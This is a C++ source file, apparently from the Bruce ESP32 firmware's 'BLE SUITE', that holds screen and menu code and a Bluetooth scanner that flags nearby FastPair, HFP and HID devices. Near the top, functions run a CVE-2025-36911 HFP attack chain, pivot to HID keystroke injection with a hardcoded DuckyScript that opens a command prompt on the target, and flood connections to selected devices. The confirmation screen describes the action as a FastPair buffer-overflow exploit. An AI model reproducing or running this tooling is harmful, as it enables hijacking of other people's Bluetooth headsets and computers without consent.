    std::vector<String> lines;
    lines.push_back("HFP VULNERABILITY TEST");
    lines.push_back("Target: " + String(target.toString().c_str()));
    lines.push_back("CVE-2025-36911: " + String(vulnerable ? "POTENTIALLY VULNERABLE" : "LIKELY PATCHED"));
    lines.push_back("");
    
    if(vulnerable) {
        lines.push_back("Device has HFP service");
        lines.push_back("and allowed attribute access");
        lines.push_back("");
        lines.push_back("May be vulnerable to");
        lines.push_back("unauthorized pairing/mic access");
        showDeviceInfoScreen("HFP WARNING", lines, TFT_ORANGE, TFT_BLACK);
    } else {
        lines.push_back("No HFP service found or");
        lines.push_back("access was denied");
        lines.push_back("");
        lines.push_back("Device may be patched");
        showDeviceInfoScreen("HFP TEST", lines, TFT_BLUE, TFT_WHITE);
    }
}

void runHFPAttackChain(NimBLEAddress target) {
    if(!confirmAttack("Execute full HFP attack chain?")) return;
    
    HFPExploitEngine hfp;
    hfp.executeHFPAttackChain(target);
}

void runHFPHIDPivotAttack(NimBLEAddress target) {
    if(!confirmAttack("Execute HFP → HID pivot attack?")) return;
    
    HFPExploitEngine hfp;
    showAttackProgress("Testing HFP vulnerability...", TFT_WHITE);
    
    if(hfp.testCVE202536911(target)) {
        showAttackProgress("Device vulnerable! Attempting HFP connection...", TFT_GREEN);
        
        if(hfp.establishHFPConnection(target)) {
            showAttackProgress("HFP connected! Pivoting to HID...", TFT_CYAN);
            
            HIDAttackServiceClass hidAttack;
            bool hidSuccess = hidAttack.injectKeystrokes(target);
            
            if(hidSuccess) {
                showAttackProgress("HID access confirmed! Running DuckyScript...", TFT_BLUE);
                HIDDuckyService ducky;
                String defaultScript = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
                bool scriptSuccess = ducky.injectDuckyScript(target, defaultScript);
                
                if(scriptSuccess) {
                    showAttackResult(true, "HFP → HID → DuckyScript chain successful!");
                } else {
                    showAttackResult(true, "HFP → HID pivot worked but script failed");
                }
            } else {
                showAttackResult(false, "HFP worked but HID pivot failed");
            }
        } else {
            showAttackResult(false, "HFP test passed but connection failed");
        }
    } else {
        showAttackResult(false, "Device not vulnerable to CVE-2025-36911");
    }
}

void runMultiTargetAttack() {
    std::vector<NimBLEAddress> targets;
    String selected = selectMultipleTargetsFromScan("SELECT TARGETS", targets);
    if(targets.empty()) return;
    MultiConnectionAttack attack;
    attack.connectionFlood(targets);
}

void showAttackProgress(const char* message, uint16_t color) {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("BLE SUITE") * 12) / 2, 15);
    tft.print("BLE SUITE");
    tft.setTextSize(1);

    tft.setTextColor(color, bruceConfig.bgColor);
    tft.setCursor(20, 80);
    tft.print(message);

    static uint8_t spinnerPos = 0;
    const char* spinner = "|/-\\";
    tft.setCursor(tftWidth - 40, 80);
    tft.print(spinner[spinnerPos % 4]);
    spinnerPos++;

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, tftHeight - 30);
    tft.print("Please wait...");
}

void showAttackResult(bool success, const char* message) {
    if(success) {
        tft.fillScreen(TFT_GREEN);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
        tft.setTextColor(TFT_WHITE, TFT_GREEN);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("SUCCESS") * 12) / 2, 15);
        tft.print("SUCCESS");
        tft.setTextSize(1);
        tft.setTextColor(TFT_BLACK, TFT_GREEN);
    } else {
        tft.fillScreen(TFT_RED);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("FAILED") * 12) / 2, 15);
        tft.print("FAILED");
        tft.setTextSize(1);
        tft.setTextColor(TFT_WHITE, TFT_RED);
    }

    tft.setCursor(20, 80);
    if(message) tft.print(message);
    else tft.print(success ? "Attack successful!" : "Attack failed");

    tft.fillRoundRect(tftWidth/2 - 40, 150, 80, 35, 5, TFT_BLACK);
    tft.setTextColor(success ? TFT_GREEN : TFT_RED, TFT_BLACK);
    tft.setCursor(tftWidth/2 - 15, 157);
    tft.print("OK");

    tft.setTextColor(success ? TFT_BLACK : TFT_WHITE, success ? TFT_GREEN : TFT_RED);
    tft.setCursor(20, tftHeight - 30);
    tft.print("Press SEL to continue...");

    while(!check(SelPress)) delay(50);
    delay(200);
}

bool confirmAttack(const char* targetName) {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("CONFIRM ATTACK") * 12) / 2, 15);
    tft.print("CONFIRM ATTACK");
    tft.setTextSize(1);

    tft.setCursor(20, 60);
    tft.print("Target: ");
    tft.println(targetName);
    tft.setCursor(20, 90);
    tft.println("FastPair buffer overflow exploit");

    tft.fillRect(20, 140, tftWidth - 40, 60, bruceConfig.bgColor);
    tft.fillRoundRect(50, 145, 80, 35, 5, TFT_GREEN);
    tft.setTextColor(TFT_BLACK, TFT_GREEN);
    tft.setCursor(70, 152);
    tft.print("OK");

    tft.fillRoundRect(150, 145, 80, 35, 5, TFT_RED);
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.setCursor(170, 152);
    tft.print("NO");

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, tftHeight - 35);
    tft.print("SEL: Yes  NEXT: No  ESC: Cancel");

    while(true) {
        if(check(EscPress)) return false;
        if(check(SelPress)) return true;
        if(check(NextPress)) return false;
        delay(50);
    }
}

String selectTargetFromScan(const char* title) {
    scannerData.clear();

    tft.fillScreen(TFT_GRAY);
    tft.setTextSize(3);
    tft.setTextColor(TFT_PURPLE, TFT_GRAY);
    tft.setCursor((tftWidth - tft.textWidth("BRUCE")) / 2, 40);
    tft.print("BRUCE");

    tft.setTextColor(TFT_BLUE, TFT_GRAY);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - tft.textWidth("BLE SUITE")) / 2, 90);
    tft.print("BLE SUITE");

    tft.setTextColor(TFT_GREEN, TFT_GRAY);
    tft.setTextSize(1);
    tft.setCursor((tftWidth - tft.textWidth("by Ninja-Jr")) / 2, 130);
    tft.print("by Ninja-Jr");
    delay(1500);

    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen(title) * 12) / 2, 15);
    tft.print(title);
    tft.setTextSize(1);

    tft.setCursor(20, 60);
    tft.print("Initializing BLE...");

    bool wasBLEInitialized = isBLEInitialized();
    if(wasBLEInitialized) {
        NimBLEDevice::deinit(true);
        delay(500);
    }

    NimBLEDevice::init("Bruce-Scanner");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);

    NimBLEScan* pBLEScan = NimBLEDevice::getScan();
    if(!pBLEScan) {
        tft.fillScreen(TFT_RED);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
        tft.setTextColor(TFT_WHITE, TFT_RED);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - tft.textWidth("ERROR")) / 2, 15);
        tft.print("ERROR");
        tft.setTextSize(1);
        tft.setCursor(20, 60);
        tft.print("Failed to create BLE scanner!");
        delay(2000);
        return "";
    }

    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(97);
    pBLEScan->setWindow(67);
    pBLEScan->setDuplicateFilter(false);

    tft.setCursor(20, 100);
    tft.print("Scanning for devices...");

    const int ACTIVE_SCAN_TIME = 10;
    const int PASSIVE_SCAN_TIME = 10;

    tft.setCursor(20, 120);
    tft.print("Active scan (10s)...");

#if __has_include(<NimBLEExtAdvertising.h>)
    #define NIMBLE_V2_PLUS 1
#endif

#ifdef NIMBLE_V2_PLUS
    NimBLEScanResults results = pBLEScan->getResults(ACTIVE_SCAN_TIME*1000, false);
#else
    NimBLEScanResults results = pBLEScan->start(ACTIVE_SCAN_TIME, false);
#endif

    tft.setCursor(20, 140);
    tft.print("Passive scan (10s)...");
    pBLEScan->setActiveScan(false);

#ifdef NIMBLE_V2_PLUS
    results = pBLEScan->getResults(PASSIVE_SCAN_TIME*1000, false);
#else
    results = pBLEScan->start(PASSIVE_SCAN_TIME, false);
#endif

    if(results.getCount() == 0) {
        pBLEScan->stop();
        NimBLEDevice::deinit(true);

        tft.fillScreen(TFT_YELLOW);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
        tft.setTextColor(TFT_BLACK, TFT_YELLOW);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - tft.textWidth("NO DEVICES")) / 2, 15);
        tft.print("NO DEVICES");
        tft.setTextSize(1);
        tft.setCursor(20, 60);
        tft.print("No BLE devices found!");
        tft.setCursor(20, 80);
        tft.print("Make sure BLE devices are");
        tft.setCursor(20, 100);
        tft.print("turned on and in range.");
        tft.setCursor(20, 130);
        tft.print("Devices found: 0");
        delay(2000);
        return "";
    }

    for(int i = 0; i < results.getCount(); i++) {
        const NimBLEAdvertisedDevice* device = results.getDevice(i);

        String address = String(device->getAddress().toString().c_str());
        String name = String(device->getName().c_str());
        if(name.isEmpty() || name == "(null)" || name == "null" || name == "NULL") {
            name = "Unknown";
        }

        int rssi = device->getRSSI();
        if(rssi == 0) rssi = -100;

        bool fastPair = false;
        bool hasHFP = false;
        uint8_t deviceType = 0;

        if(device->haveServiceUUID()) {
            NimBLEUUID uuid = device->getServiceUUID();
            std::string uuidStr = uuid.toString();
            if(uuidStr.find("fe2c") != std::string::npos) fastPair = true;
            if(uuidStr.find("111e") != std::string::npos || uuidStr.find("111f") != std::string::npos) hasHFP = true;
            if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) deviceType |= 0x01;
            if(uuidStr.find("1812") != std::string::npos) deviceType |= 0x02;
        }

        scannerData.addDevice(name, address, rssi, fastPair, hasHFP, deviceType);
    }

    pBLEScan->stop();
    pBLEScan->clearResults();
    NimBLEDevice::deinit(true);

    size_t deviceCount = scannerData.size();

    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size() - 1; i++) {
            for(size_t j = i + 1; j < scannerData.deviceAddresses.size(); j++) {
                bool swapNeeded = false;
                if(scannerData.deviceFastPair[j] && !scannerData.deviceFastPair[i]) swapNeeded = true;
                else if(scannerData.deviceFastPair[j] == scannerData.deviceFastPair[i] && scannerData.deviceRssi[j] > scannerData.deviceRssi[i]) swapNeeded = true;

                if(swapNeeded) {
                    std::swap(scannerData.deviceNames[i], scannerData.deviceNames[j]);
                    std::swap(scannerData.deviceAddresses[i], scannerData.deviceAddresses[j]);
                    std::swap(scannerData.deviceRssi[i], scannerData.deviceRssi[j]);

                    bool tempFastPair = scannerData.deviceFastPair[i];
                    scannerData.deviceFastPair[i] = scannerData.deviceFastPair[j];
                    scannerData.deviceFastPair[j] = tempFastPair;

                    bool tempHFP = scannerData.deviceHasHFP[i];
                    scannerData.deviceHasHFP[i] = scannerData.deviceHasHFP[j];
                    scannerData.deviceHasHFP[j] = tempHFP;
                    std::swap(scannerData.deviceTypes[i], scannerData.deviceTypes[j]);
                }
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }

    int maxVisibleDevices = 3;
    int deviceItemHeight = 30;
    int menuStartY = 60;
    int selectedIdx = 0;
    int scrollOffset = 0;
    bool exitLoop = false;

    while(!exitLoop) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("SELECT DEVICE") * 12) / 2, 15);
        tft.print("SELECT DEVICE");
        tft.setTextSize(1);

        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.setCursor(20, 40);
        tft.print("Found: ");
        tft.print(deviceCount);
        tft.print(" devices");

        for(int i = 0; i < maxVisibleDevices && (scrollOffset + i) < deviceCount; i++) {
            String displayName;
            String address;
            int rssi = 0;
            bool fastPair = false;
            bool hasHFP = false;
            uint8_t deviceType = 0;

            if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
                int deviceIndex = scrollOffset + i;
                if(deviceIndex < scannerData.deviceNames.size()) {
                    displayName = scannerData.deviceNames[deviceIndex];
                    address = scannerData.deviceAddresses[deviceIndex];
                    rssi = scannerData.deviceRssi[deviceIndex];
                    fastPair = scannerData.deviceFastPair[deviceIndex];
                    hasHFP = scannerData.deviceHasHFP[deviceIndex];
                    deviceType = scannerData.deviceTypes[deviceIndex];
                }
                xSemaphoreGive(scannerData.mutex);
            }

            if(displayName.isEmpty()) continue;

            String displayText = displayName;
            if(displayText.length() > 18) displayText = displayText.substring(0, 15) + "...";
            displayText += " (" + String(rssi) + "dB)";
            if(fastPair) displayText += " [FP]";
            if(hasHFP) displayText += " [HFP]";
            if(deviceType & 0x01) displayText += " [AUDIO]";
            if(deviceType & 0x02) displayText += " [HID]";

            int yPos = menuStartY + (i * deviceItemHeight);
            if(yPos + deviceItemHeight > tftHeight - 45) break;

            if(i == selectedIdx - scrollOffset) {
                tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(20, yPos + 10);
                tft.print("> ");
            } else {
                tft.fillRect(15, yPos, tftWidth - 30, deviceItemHeight - 5, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(20, yPos + 10);
                tft.print("  ");
            }
            tft.print(displayText);
        }

        if(deviceCount > maxVisibleDevices) {
            tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
            tft.setCursor(tftWidth - 25, menuStartY + 10);
            if(scrollOffset > 0) tft.print("^");
            tft.setCursor(tftWidth - 25, menuStartY + (maxVisibleDevices * deviceItemHeight) - 15);
            if(scrollOffset + maxVisibleDevices < deviceCount) tft.print("v");
        }

        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");

        bool gotInput = false;
        while(!gotInput) {
            if(check(EscPress)) {
                exitLoop = true;
                gotInput = true;
            } else if(check(PrevPress)) {
                delay(150);
                if(selectedIdx > 0) {
                    selectedIdx--;
                    if(selectedIdx < scrollOffset) scrollOffset = selectedIdx;
                } else {
                    selectedIdx = deviceCount - 1;
                    scrollOffset = std::max(0, (int)deviceCount - maxVisibleDevices);
                }
                gotInput = true;
            } else if(check(NextPress)) {
                delay(150);
                if(selectedIdx < deviceCount - 1) {
                    selectedIdx++;
                    if(selectedIdx >= scrollOffset + maxVisibleDevices) scrollOffset = selectedIdx - maxVisibleDevices + 1;
                } else {
                    selectedIdx = 0;
                    scrollOffset = 0;
                }
                gotInput = true;
            } else if(check(SelPress)) {
                String selectedMAC = "";
                String selectedName = "";

                if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
                    if(selectedIdx < scannerData.deviceAddresses.size()) {
                        selectedMAC = scannerData.deviceAddresses[selectedIdx];
                        selectedName = scannerData.deviceNames[selectedIdx];
                    }
                    xSemaphoreGive(scannerData.mutex);
                }

                if(!selectedMAC.isEmpty()) {
                    scannerData.clear();
                    return selectedMAC + ":0";
                }
                gotInput = true;
            }
            if(!gotInput) delay(50);
        }
    }
    scannerData.clear();
    return "";
}

String selectMultipleTargetsFromScan(const char* title, std::vector<NimBLEAddress>& targets) {
    targets.clear();
    String singleTarget = selectTargetFromScan(title);
    if(!singleTarget.isEmpty()) targets.push_back(parseAddress(singleTarget));
    return singleTarget;
}

NimBLEAddress parseAddress(const String& addressInfo) {
    int colonPos = addressInfo.lastIndexOf(':');
    if(colonPos == -1) {
        std::string addrStr = addressInfo.c_str();
        return NimBLEAddress(addrStr, BLE_ADDR_PUBLIC);
    }
    String mac = addressInfo.substring(0, colonPos);
    std::string addrStr = mac.c_str();
    return NimBLEAddress(addrStr, BLE_ADDR_PUBLIC);
}

bool requireSimpleConfirmation(const char* message) {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("CONFIRM") * 12) / 2, 15);
    tft.print("CONFIRM");
    tft.setTextSize(1);

    tft.fillRect(20, 50, tftWidth - 40, 80, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 85);
        if(msgStr.length() > 60) tft.print(msgStr.substring(30, 60) + "...");
        else tft.print(msgStr.substring(30));
    } else tft.print(message);

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, tftHeight - 35);
    tft.print("SEL: OK  ESC: Cancel");

    while(true) {
        if(check(EscPress)) {
            showAttackProgress("Cancelled", TFT_WHITE);
            delay(1000);
            return false;
        }
        if(check(SelPress)) return true;
        delay(50);
    }
}

int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2, const char* btn3, uint16_t color, bool showEscHint, bool autoProgress) {
    int buttonCount = 0;
    if(strlen(btn1) > 0) buttonCount++;
    if(strlen(btn2) > 0) buttonCount++;
    if(strlen(btn3) > 0) buttonCount++;

    if(buttonCount == 0 && autoProgress) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
        tft.print("MESSAGE");
        tft.setTextSize(1);

        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 80);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 105);
            if(lineStr.length() > 60) tft.print(lineStr.substring(30, 60) + "...");
            else tft.print(lineStr.substring(30));
        } else tft.print(line1);
        delay(1500);
        return 0;
    }

    if(buttonCount == 0) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
        tft.print("MESSAGE");
        tft.setTextSize(1);

        tft.setTextColor(color, bruceConfig.bgColor);
        tft.fillRect(20, 60, tftWidth - 40, 100, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) tft.print(lineStr.substring(30, 60) + "...");
            else tft.print(lineStr.substring(30));
        } else tft.print(line1);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("Press any key to continue...");

        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    } else if(buttonCount == 1) {
        const char* buttons[] = {btn1, btn2, btn3};
        const char* actualBtn = "";
        for(int i = 0; i < 3; i++) if(strlen(buttons[i]) > 0) { actualBtn = buttons[i]; break; }

        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("MESSAGE") * 12) / 2, 15);
        tft.print("MESSAGE");
        tft.setTextSize(1);

        tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            if(lineStr.length() > 60) {
                tft.setCursor(20, 95);
                tft.print(lineStr.substring(30, 60) + "...");
            }
        } else tft.print(line1);

        String btnText = actualBtn;
        if(btnText.length() > 12) btnText = btnText.substring(0, 9) + "...";
        int btnWidth = btnText.length() * 12 + 20;
        if(btnWidth < 100) btnWidth = 100;
        int btnX = (tftWidth - btnWidth) / 2;
        int btnY = 150;

        tft.fillRoundRect(btnX, btnY, btnWidth, 35, 5, bruceConfig.priColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
        int textWidth = btnText.length() * 6;
        int textX = btnX + (btnWidth - textWidth) / 2;
        tft.setCursor(textX, btnY + 12);
        tft.print(btnText);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("SEL: Select  ESC: Cancel");

        while(true) {
            if(check(EscPress)) { delay(200); return -1; }
            if(check(SelPress)) { delay(200); return 0; }
            delay(50);
        }
    } else {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("SELECT") * 12) / 2, 15);
        tft.print("SELECT");
        tft.setTextSize(1);

        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        tft.print(line1);

        int btnWidth = 80;
        int btnHeight = 35;
        int btnY = 150;

        if(strlen(btn1) > 0) {
            tft.fillRoundRect(50, btnY, btnWidth, btnHeight, 5, bruceConfig.priColor);
            tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
            tft.setCursor(60, btnY + 12);
            String btn1Str = btn1;
            if(btn1Str.length() > 8) btn1Str = btn1Str.substring(0, 5) + "...";
            tft.print(btn1Str);
        }

        if(strlen(btn2) > 0) {
            tft.fillRoundRect(150, btnY, btnWidth, btnHeight, 5, bruceConfig.secColor);
            tft.setTextColor(TFT_WHITE, bruceConfig.secColor);
            tft.setCursor(160, btnY + 12);
            String btn2Str = btn2;
            if(btn2Str.length() > 8) btn2Str = btn2Str.substring(0, 5) + "...";
            tft.print(btn2Str);
        }

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        if(strlen(btn3) > 0) tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
        else tft.print("SEL: Btn1  NEXT: Btn2  ESC: Back");

        while(true) {
            if(check(EscPress)) { delay(200); return -1; }
            if(check(SelPress)) { delay(200); return 0; }
            if(check(NextPress)) { delay(200); return 1; }
            if(strlen(btn3) > 0 && check(PrevPress)) { delay(200); return 2; }
            delay(50);
        }
    }
}

void showWarningMessage(const char* message) {
    tft.fillScreen(TFT_YELLOW);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);

    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("WARNING") * 12) / 2, 15);
    tft.print("WARNING");
    tft.setTextSize(1);

    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_YELLOW);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) tft.print(msgStr.substring(30, 60) + "...");
        else tft.print(msgStr.substring(30));
    } else tft.print(message);

    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    tft.setCursor(20, tftHeight - 35);
    tft.print("Press any key to continue...");

    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showErrorMessage(const char* message) {
    tft.fillScreen(TFT_RED);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);

    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("ERROR") * 12) / 2, 15);
    tft.print("ERROR");
    tft.setTextSize(1);

    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_RED);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) tft.print(msgStr.substring(30, 60) + "...");
        else tft.print(msgStr.substring(30));
    } else tft.print(message);

    tft.setCursor(20, tftHeight - 35);
    tft.print("Press any key to continue...");

    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showSuccessMessage(const char* message) {
    tft.fillScreen(TFT_GREEN);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);

    tft.setTextColor(TFT_WHITE, TFT_GREEN);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("SUCCESS") * 12) / 2, 15);
    tft.print("SUCCESS");
    tft.setTextSize(1);

    tft.setTextColor(TFT_BLACK, TFT_GREEN);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_GREEN);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) tft.print(msgStr.substring(30, 60) + "...");
        else tft.print(msgStr.substring(30));
    } else tft.print(message);

    tft.setCursor(20, tftHeight - 35);
    tft.print("Press any key to continue...");

    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor, uint16_t textColor) {
    tft.fillScreen(bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

    tft.setTextColor(TFT_WHITE, bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen(title) * 12) / 2, 15);
    tft.print(title);
    tft.setTextSize(1);

    tft.setTextColor(textColor, bgColor);
    int yPos = 60;
    int lineHeight = 20;
    int maxLines = 8;

    for(int i = 0; i < std::min((int)lines.size(), maxLines); i++) {
        if(yPos + lineHeight > tftHeight - 45) break;
        tft.setCursor(20, yPos);
        String displayLine = lines[i];
        if(displayLine.length() > 35) displayLine = displayLine.substring(0, 32) + "...";
        tft.print(displayLine);
        yPos += lineHeight;
    }

    tft.setTextColor(TFT_WHITE, bgColor);
    tft.setCursor(20, tftHeight - 35);
    tft.print("Press any key to continue...");

    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}
